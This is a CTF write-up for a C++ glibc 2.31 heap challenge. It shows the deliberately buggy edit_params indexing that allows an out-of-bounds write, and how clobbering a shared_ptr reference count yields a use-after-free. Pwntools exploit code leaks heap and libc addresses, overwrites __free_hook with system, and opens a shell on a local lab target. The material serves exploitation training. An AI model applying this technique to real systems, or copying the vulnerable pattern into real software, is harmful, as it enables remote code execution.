# smoothie_operator<<

## Hashes and versions

MD5 hashes: 

```
smoothie_operator : 79ee63a203b20124e5d7cf8cafd525a6
libc-2.31.so : 5898fac5d2680d0d8fefdadd632b7188
OS : Ubuntu 20.04 (docker sha256:450e066588f42ebe1551f3b1a535034b6aa46cd936fe7f2c6b0d72997ec61dbd)
```

## Description

This challenge incorporates an OOB heap write to corrupt heap metadata, creating a UAF by clobbering the `std::shared_ptr` struct. Further details on the challenge are below, including an overview of relevant C++ structs and how they appear in memory. The challenge is a x86-64 ELF binary linked against glibc 2.31 (prior to the introduction of heap safe-linking in 2.32). This version is important for the exploit to work, as it relies on corrupting `__free_hook` and does not reveal/write masked pointer addresses. 

## Vulnerabilities

This program has a single key vulnerability (and another omission, which is a mistake) that can yield RCE. The vulnerability is incorrect array (or vector) indexing in the `Monster` (or `Pastry`) `edit_params` function:

```cpp
void Monster::edit_params() {
    long long n;

    n = 0;
    for (; n < ARRSIZE; n++) 
        std::cout << n + 1 << ". " << FLAVORS[n] << std::endl;

    printf("Choose an flavor to edit: ");
    std::cin >> n;
    if (n < 0) goto fail;
    else {
        // vuln here - logic sequence error
        // entering index 0 allows an OOB write at quantities[0xff]
        n--;
        long long s = ARRSIZE;
        if (n < s) {
            std::cout << "Enter a new quantity: ";
            std::cin >> quantities[(uint8_t)n];
            return;
        }
        else { goto fail; }
    }
    
    fail:
        std::cout << "[ ERROR ] : invalid flavor index\n";
        return;
}
```

As shown above, inputting an index of 0 passes both size checks, because they are done separately while separated by a logical operation (`n--`). This results in an OOB heap overwrite at `quantities[0xff]`.

## Exploit

### `std::string`s

`std::string* s = new std::string(input)` creates a new allocation on the heap which varies in size depending on the input. Any input less than 0x10 bytes receives a 0x30 allocation (0x20 for data, 0x8 for metadata, 0x8 for padding) in the following layout 

``` 
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- | 
|           pad                         |             chunk metadata            |
|           ptr to string data          |                  size                 |
|           data ....                                                           |
``` 

This implies that the ptr in the first quadword points to the address 0x10 bytes below it, and the data immediately follows the `ptr, size` preamble. 

This layout deviates when the allocation size exceeds 0x10 bytes:

```
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- | 
|           pad                         |             chunk metadata            |
|           ptr to string data          |                  size                 |
|           size                        |                  blank                |

...
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- | 
|           pad                         |             chunk metadata            |
|           string data...                                                      |
|                                                                               |
...

```

In this case, the data resides in a different allocation, sized to fit. So, strings smaller than 0x10 bytes fit within the `std::string` control block, and any larger string requires an additional allocation, maintained by the pointer in the control block. This difference is important for heap grooming. 

### `vector<T>` 

Vectors are dynamic objects and thus C++ allocates them on the heap. Because a vector consists of metadata that is a fixed size (pointer to the data's start, pointer to the data's end, and pointer to the total allocation's end), the metadata exists separately from the data and can be stored on the stack or in an object, with a fixed 0x18 size (for 64-bit architectures). Therefore, allocating a vector of a few `uint32_t` results in the following: 


```
metadata (on stack or in dynamically allocated object)
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- | 
|           pad                         |             chunk metadata            |
|           ptr to data start           |             ptr to data end           |
|           ptr to alloc end            | 

data (on heap)
| -- 1 -- | -- 2 -- | -- 3 -- | -- 4 -- | -- 5 -- | -- 6 -- | -- 7 -- | -- 8 -- | 
|           pad                         |             chunk metadata            |
|           int1    |        int 2      |         int 3     |        int 4      |  < data end
|                                       |                                       |  < allocation end
```

It is important to note that the pointers may change as the vector size changes - C++ doubles memory every expansion and copies over data to newly allocated chunks, so expanding and shrinking vectors does affect heap layout and the allocation / freeing of different size chunks (though these chunk sizes come in regular intervals, e.g.: 0x30, 0x50, 0x90, etc.)

### `shared_ptr`s 

Shared pointers create new heap objects when initialized through `make_shared<T>`. These allocations can be thought of as a wrapper around `T`, whether that be a primitive data type or a `Class`. The allocation takes the following form in memory. 

```
0x00 - 0x08 bytes: shared_ptr vtable
0x08 - 0x0c bytes: shared reference count 
0x0c - 0x10 bytes: weak reference count
```

So long as a `shared_ptr` or an object containing one holds a reference to the wrapped data, the shared counter is greater than 0. Every time a `shared_ptr` falls out of scope, the binary checks to see if the reference count hit 0. If it did, it frees not only the shared pointer, but type `T` inside it (if applicable). 


### Using the OOB

Adding any order from the main menu created a `shared_ptr<T>` on the heap where `T` is the order type, inherited from base class `Order`. For example, allocating a new `Monster` order yields the following heap structure: 

```gdb
0x55b73c837a80:	0x0000000000000000	0x0000000000000061  << [ pad , allocation size | FLAGS ]
0x55b73c837a90:	0x000055b73be68980	0x0000000100000002  << [ vtable for std::_Sp_counted_ptr_inplace<Monster... , shared count / weak count ]
0x55b73c837aa0:	0x000055b73be68a58	0x0000001400000021  << [ vtable for Monster, item number / dollars ]
0x55b73c837ab0:	0x0000000000000014	0x0000000000000000  << [ cents , (unused) ]
0x55b73c837ac0:	0x0000000000000001	0x000004d200000000  << [ order state , unused / quantities[0] ]
0x55b73c837ad0:	0x00001a85000011d7	0x0000000000000000  << [ quantities[2..3], quantities[4..5 ]
0x55b73c837ae0:	0x0000000000000000                      << [ quantities[6..7],
```

This shows that `Monster->quantities` starts at a 0xc boundary, and that `quantities[0xff]` falls on a 0x8 boundary (`0xc + 0xff * 4 = 0x408`). So the overwrite is a full four-byte clobber on a 0x8 heap chunk boundary. An exploit could perhaps use this to change a chunk size, but cannot use it for a partial pointer overwrite, since `cin >> quantities[0xff]` nulls out unused bytes in the `uint32_t`. 

Instead, the 4-byte OOB can clobber the shared pointer reference count, setting it to 0. Then, the next time the program uses this `shared_ptr` it will eventually fall out of scope and trigger cleanup. This can lead to a UAF, so long as an encompassing data structure maintains access to the `shared_ptr` (in this case, the `OrderList`). Cleanup includes freeing any standard, heap-allocated data structures in the object automatically - so clobbering a `shared_ptr<Pastry>` frees its class member variable `std::vector<uint32_t> quantities`. However, edit access to that data structure  remains from the `OrderList` via the `Pastry::edit_params` function. The process for setting this up requires some heap feng shui, as shown below. It is important to fill the heap with some 0x30 size chunks, since the UAF (`std::vector<uint32_t> quantities`) in the `shared_ptr<Pastry>` is a 0x30-sized structure itself (thanks to `vector::reserve` in the constructor). Thankfully, the `Complaint` object uses `string::shrink_to_fit` on its data to allow finer grained heap control. Heap feng shui is important, but not the specific crux of this challenge!

```python
    # allocate pastry object which will originate the OOB write
    add_monster(33, [1234, 4567, 6789], 20, 20)

    # add pastry so that we can free it to populate 0x50 cache, if needed
    add_pastry(101, [1234, 4567, 6789], 20, 20)

    # fill space, need to align a pastry object 0xff * 4 bytes after
    # the array start in a Monster object (0xff * 4), or ~0x3f8 bytes
    # each complaint will allocate only a 0x30 chunk, so long as it 
    # is 0x10 chars or less 

    # start with a complaint to get the alignment on the heap correct
    add_complaint("B" * 0x58)

    # allocate a bunch of 0x30 structs, needed for flipping tcache and fastbins
    for i in range(10):
        add_complaint(chr(i + 0x31))

    # add pastry which is target of the overflow 
    add_pastry(49, [ 0x414243, 0x414243, 0x414243 ], 0, 20)

    # overflow editing the original entry, clobbering order #49 shared_ptr control block
    edit_monster(33, 0, 0, 20, 20) # overwrites counter of shared pointer instances to 0
```

Next, the UAF must jump between fastbins (or tcache, if you're daring) and unsorted bins to leak a heap and glibc address, respectively. Fastbins has fewer linked list checks, so it is the safer option. Freeing the previously allocated 0x30 complaints populates 0x30 tcache so that the UAF, triggered upon using the `shared_ptr` with `prep_order()`, sits in fastbins. Dumping the queue at this point tries to print the pastry's `std::vector<uint32_t> quantities`, however the vector's data chunk is freed. So instead of printing `uint32_t` quantity values, it prints whatever pointer is in the fastbins `fw` pointer, leaking a heap address. 

```python
    # fill tcache
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)

    # free the clobbered shared_ptr by triggering any use, such as moving it to a new state 
    prep_order(49)

    # dump queue, which should print a broken pointer in order #49
    leak1 = print_queue()
    leak1 = leak1[leak1.find("Order: #49") + len("Order: #49"):]
    leak1 = leak1[leak1.find("quantities:") + len("quantities:") + 1:]
    leak1 = int(leak1.split("\n")[1].split(" ")[-1]) + \
        (int(leak1.split("\n")[2].split(" ")[-1]) << 32)
    heap_addr = leak1
    fake_chunk_addr = heap_addr + 0xe0
    print(hex(fake_chunk_addr))
```

Flipping the UAF to smallbins leaks a glibc pointer, since it points at the heap arena instead of fastbins. This requires heap consolidation, which results from creating a very large allocation (such as a 0x2000 byte complaint). 


```python
    # consolidate heap to dump libc address. This pushes the UAF (in fastbins)
    # to smallbins, which links to the main arena
    add_complaint("B" * 0x2000)

    # leaded address is main_arena + 0x128 (smallbins for 0x30)
    leak2 = print_queue()
    leak2 = leak2[leak2.find("Order: #49") + len("Order: #49"):]
    leak2 = leak2[leak2.find("quantities:") + len("quantities:") + 1:]
    leak2 = int(leak2.split("\n")[1].split(" ")[-1]) + \
        (int(leak2.split("\n")[2].split(" ")[-1]) << 32)    
    glibc_addr = leak2
    free_hook = glibc_addr + 0x2248
    system = free_hook - 0x19cbb8
    print(hex(free_hook))
```

After that, it is a matter of aligning the UAF with a same-size data structure that extends its capabilities. Overlapping with `std::string` control chunk is perfect, because it occupies the same size (0x30 bytes, incl. metadata) on the heap as the freed `quantities` vector data and has a pointer in its first quadword. This is also an easily allocation to make using the `Complaint` struct, which is a simple `std::string` with variable size, but does require some heap feng shui so that the UAF is allocatable. Once overlapping, overwriting the first two quantities in the UAF clobbers the pointer to the string data. Setting this to `__free_hook`'s address and then editing the complaint to `&system` now diverts execution flow to `system(ptr)` for every call to `free(ptr)`. 

```python
    # empty tcache and both 0x30 in smallbins (incl. UAF)
    for i in range(7):
        add_complaint(chr(i + 0x31))
    
    # move all chunks back to fill tcache and fastbins, with the 
    # UAF in fastbins
    for i in range(7):
        resolve_complaint(7)
    resolve_complaint(1)

    # empty tcache and both 0x30 in smallbins
    # this puts the UAF overlapping a string, with the first index pointing to the 
    # string data
    for i in range(9):
        add_complaint(chr(i + 0x31))
    
    ...

    # use the UAF to overwrite the string data pointer to free_hook
    # need to do it in two dword overwrites
    edit_pastry(49, 1, free_hook & 0xffffffff, 0, 20) 
    edit_pastry(49, 2, free_hook >> 32, 0, 20) 

    # edit the complaint, which now points at free hook, to &system
    edit_complaint(14, system.to_bytes(8, "little"))
```

The last step is placing something meaningful to free on the heap so that `free(ptr)` calls `system(ptr)` without a crash. Using the above background information on `std::string`, allocating any data larger than 0x10 bytes results in two allocations: one for the control block and one for the data. In this situation, the data chunk is literally a pointer to the `char*` returned by `std:string::c_str()`. Therefore, allocating `"/" * 0x30 + "bin/sh"` is perfect, because it is freed first when the `std::string` is `delete`d. Allocating and freeing this string using a complaint fulfills the needs, resulting in a remote shell.

```python
    # add string that has its own /bin/sh allocation, so pointer points right at c_str
    add_complaint("/" * 0x30 + "bin/sh")
    
    ...

    # free complaint 15 (/////.../bin/sh). It's giving shell
    p.send(b'9\n')
    p.recvuntil(b"> ")
    p.send(b'15\n')

    p.interactive()
```

```bash
[+] Opening connection to 127.0.0.1 on port 6666: Done
0x55ba35f28e40
0x7f5949957e48
[*] Switching to interactive mode
$ ls
flag.txt
smoothie_operator
$ cat flag.txt
Sh4r3d_ptrs_R_sm00th$  
```

## Testing It Out
The `Dockerfile` allows testing locally and "remotely" if desired. The default `Dockerfile` hosts the binary on port 6666, similar to a CTF challenge. Simply run:

```bash
make build
make host
```

from one terminal and 

```python
cd exp; python3 exploit.py
```

from another with `DEBUG = False` and `LOCAL = False` in the exploit script. Toggling these options allows for local testing and debugging within the Docker container using `make run`. For debugging, it is recommended to use the commented code in the `Dockerfile` to build an environment with `pwntools` and `gdb`. 
